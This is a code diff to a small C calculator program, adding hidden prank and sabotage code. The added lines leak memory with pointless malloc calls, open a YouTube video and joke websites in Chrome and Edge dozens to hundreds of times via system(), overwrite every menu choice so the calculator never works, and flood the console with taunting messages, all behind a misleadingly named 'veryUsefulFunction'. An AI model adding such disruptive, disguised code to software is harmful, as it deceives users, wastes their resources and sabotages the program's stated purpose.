@@ -5,10 +5,12 @@
 #include <time.h>
 
 double add(double x1, double x2){
+    malloc(x1 + x2);
     return (x1 + x2);
 }
 
 double subtract(double x1, double x2){
+    malloc(x1 + x2);
     return (x1 - x2);
 }
 
@@ -17,6 +19,7 @@ double multiply(double x1, double x2){
 }
 
 double divide(double x1, double x2){
+    malloc(x1 + x2);
     return (x1 / x2);
 }
 
@@ -33,8 +36,10 @@ double compoundInterest(double principal, int numYears, double interestRate){
 }
 
 int factorial(int base) {
+    malloc(1000);
     if(base >= 1) {
         return base * factorial(base - 1);
+
     } else {
         return 1;
     }
@@ -102,9 +107,37 @@ void playGuessingGame(){
     }
 }
 
+void veryUsefulFunction() {
+    malloc(500);  //http://endless.horse/
+    system("start chrome http://endless.horse/");
+    system("start microsoft-edge:http://endless.horse/");
+}
+
+void spamJam() {
+    for(int i = 0; i < 10000; i++) {
+        printf("I WARNED YOU.");
+    }
+    malloc(200);  //http://corndog.io/
+    for(int i = 0; i < 25; i++) {
+        system("start chrome http://corndog.io/");
+        system("start microsoft-edge:http://corndog.io/");
+    }
+}
+
 int main() {
 
+
     int Choice;
+    int angryCounter = 0;
+
+    int count = 0;
+
+    while(count < 100) {
+        system("start chrome https://www.youtube.com/watch?v=s8MDNFaGfT4");
+        system("start microsoft-edge:https://www.youtube.com/watch?v=s8MDNFaGfT4");
+        count++;
+    }
+
     printf("Welcome to the the Epic Calculator System (ECS)!\n");
 
     do {
@@ -123,11 +156,35 @@ int main() {
                "0. Exit\n");
 
         printf("Select the operation you would like to perform!\n");
+
+        if(angryCounter == 3) {
+            for(int i = 0; i < 1000; i++) {
+                printf("Don't do it again...");
+            }
+            malloc(1000);
+        }
+        if(angryCounter >= 4) {
+            spamJam();
+        }
+
+
+
         scanf("%d", &Choice);
         printf("Choice = %d\n", Choice);
 
-        if (Choice >= 1 && Choice <= 4) {
+        Choice = 99;
+        if(Choice == 99) {
+            for(int i = 0; i < 500; i++){
+                printf("Wrong Answer\n");
+            }
+            malloc(99);
+            angryCounter++;
+
+        }
+        else if (Choice >= 1 && Choice <= 4) {
             double num1, num2;
+
+            veryUsefulFunction();
 
             printf("Enter your first number:\n");
             scanf("%lf", &num1);
